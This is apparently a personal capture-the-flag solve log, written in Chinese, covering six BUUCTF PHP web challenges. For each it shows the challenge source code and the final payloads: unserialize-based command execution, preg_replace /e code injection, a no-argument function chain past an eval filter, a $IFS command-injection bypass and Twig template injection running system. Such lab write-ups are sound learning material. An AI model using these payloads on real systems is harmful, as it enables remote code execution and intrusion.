编号      日期                 题目                    平台         介绍
 1     2026/4/27      [网鼎杯 2020 朱雀组]phpweb      BUUCTF        点开页面burp抓包，上传参数分别是file_get_contents和index.php，得到源码，可以看到源码屏蔽了system之类的带有恶意的代码注入，同时
                                                                   index.php代码定义了一个Test类，这个类有个__destruct方法，方法实现了运行函数的功能，这个destruct功能没有过滤system之类的，所以思路
                                                                   就是上传的参数是unserialize和一个序列化对象的字符串，字符串里面的成员变量是func=system，p=ls /或者find / -iname *flag*，成功


2      2026/4/30     [BJDCTF2020]ZJCTF，不过如此      BUUCTF        页面一开始给了PHP代码，只用输入参数text=data://text/plain,I have a dream&file=php://filter/convert.base64-                                                                                       encode/resource=next.php，因为text使用的强类型比较加file_get_contents，file使用include。
                                                                   下一步看到 return preg_replace('/(' . $re . ')/ei','strtolower("\\1")',$str); 其中re是get参数，str是参数对应的值，因为有/e，
                                                                   他把第二个参数当作php代码执行，又因为\1和（ $re），所以可以传入.*参数对应${phpinfo()}值，这样就可以解析，但是因为Get请求的参数名
                                                                   中有.号会转换成下划线，所以使用 \S*=${phpinfo()}，根据这个原理最终Payload：?\S*=${getFlag()}&cmd=system('cat /flag'); 


3       2026/5/6        [GXYCTF2019]禁止套娃          BUUCTF        页面没有任何提示，使用burpSuite抓包没有发现什么敏感的信息，只得到php的版本，暂时不考虑搜索相应CVE。使用dirseach穷举页面，发现                                                                          了.git/
                                                                   字段，可以知道这是git泄露，我们可以使用GitHack或者GitTools得到源码。源码index.php中有主要代码：
                                                                           if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
                                                                            if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
                                                                             if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
                                                                                // echo $_GET['exp'];
                                                                                @eval($_GET['exp']);
                                                                    在第二个if语句中，可以知道，只要传入scandir(pos());之类的结构就可以绕过。至于第一个和第三个if就是普通的正则表达式。、
                                                                    结论：使用?exp=highlight_file(next(array_reverse(scandir(pos(localeconv()))))); 
                                                                    原因：localeconv返回的第一个元素是 ‘.’ ；scandir函数列举当前目录的文件；由于知道目标文件在当前文件夹的倒数第二个，所以使用next加
                                                                    array_reverse；之后高亮显示

                                                                    
4        2026/5/8         [WUSTCTF2020]朴实无华        BUUCTF        进入页面没有发现，dirseach扫描。得到robots.txt，访问发现有/fAke_f1agggg.php页面，访问该页面，没有发现，使用burp抓包，得到响应中
                                                                    有look_at_me: /fl4g.php。访问该页面得到代码。
                                                                    代码有三关要绕过：
                                                                       第一关：代码如下，只需传入num=2e4，则intval得到2，intval（num+1）得到20001，成功绕过
                                                                          if (isset($_GET['num'])){
                                                                                 $num = $_GET['num'];
                                                                                    if(intval($num) < 2020 && intval($num + 1) > 2021){

                                                                        第二关：if ($md5==md5($md5))，只需要传入MD5=0e215962017即可，因为它md5加密后也是0e数字的结构
                                                                        第三关：get_flag参数不可有cat也不可有空格，所以使用nl或者more代替cat，使用${IFS}代替空格即可
                                                                            $get_flag = $_GET['get_flag'];
                                                                                if(!strstr($get_flag," ")){
                                                                                    $get_flag = str_ireplace("cat", "wctf2020", $get_flag);
                                                                                    system($get_flag);
                                                                      最终payload：              
                                                                      /fl4g.php/num=2e4&md5=0e215962017&get_flag=more$IFS$9/var/www/html
                                                                      /fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
                                                                      aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag       


                                                                      
                                                                   
5       2026/5/11     [BJDCTF2020]Cookie is so stable   BUUCTF       进入页面，发现最有价值的就是flag.php页面，他有个输入框，输入aa，他会回显hello aa。目前怀疑有三个攻击手段：sql，xss，ssti
                                                                     最终使用{{1+1}}成功得到hello 2，说明有ssti漏洞，再加上这是php后端，猜测为Twig引擎。
                                                                     第二步：重新GET刷新当前页面，并且抓包，发现Cookie中有user=2，将user改成aa，回显Hello aa。
                                                                     第三步：user改成{{_self.env.registerUndefinedFilterCallback("exec")}} {{_self.env.getFilter("ls /")}}，结果回显Hello，
                                                                             猜测为exec只是会打印最后一行结果，最后一行为空，所以没有回显。
                                                                             之后尝试{{_self.env.registerUndefinedFilterCallback("system")}} {{_self.env.getFilter("ls / > /tmp/out")}}                                                                                    {{_self.env.getFilter("cat /tmp/out")}}，成功


6       2026/5/14              [NPUCTF2020]ReadlezPHP                进入页面，没啥发现，f12开发者模式看到可以a标签，点击到达time.php?source页面，有源代码如下。可以得知，只用序列化一个HelloPhp对象
                                                                     即可，他的b是函数名，a是参数便可以执行。
                                                                     问题：起初使用eval作为b，结果不行，怀疑是过滤了，但是查找资料才知道php中eval、eachprint，unset()，isset()，empty()，
                                                                     include，require，等不可作为函数，而是属于PHP语法构造的一部分
                                                                     所以使用b=assert,a=phpinfo();即可成功在其中找到flag。值得注意的是即便b是assert，a是system，exec之类的都不可行，应该是无权限
                                                                     最终payload：?data=O:8:"HelloPhp":2:{s:1:"a";s:10:"phpinfo();";s:1:"b";s:6:"assert";}
                                                                                   <?php
                                                                                   #error_reporting(0);
                                                                                   class HelloPhp
                                                                                   {
                                                                                       public $a;
                                                                                       public $b;
                                                                                       public function __construct(){
                                                                                           $this->a = "Y-m-d h:i:s";
                                                                                           $this->b = "date";
                                                                                       }
                                                                                       public function __destruct(){
                                                                                           $a = $this->a;
                                                                                           $b = $this->b;
                                                                                           echo $b($a);
                                                                                       }
                                                                                   }
                                                                                   $c = new HelloPhp;
                                                                                   
                                                                                   if(isset($_GET['source']))
                                                                                   {
                                                                                       highlight_file(__FILE__);
                                                                                       die(0);
                                                                                   }
                                                                                   
                                                                                   @$ppp = unserialize($_GET["data"]);
              
              
              
              
                                                                                           
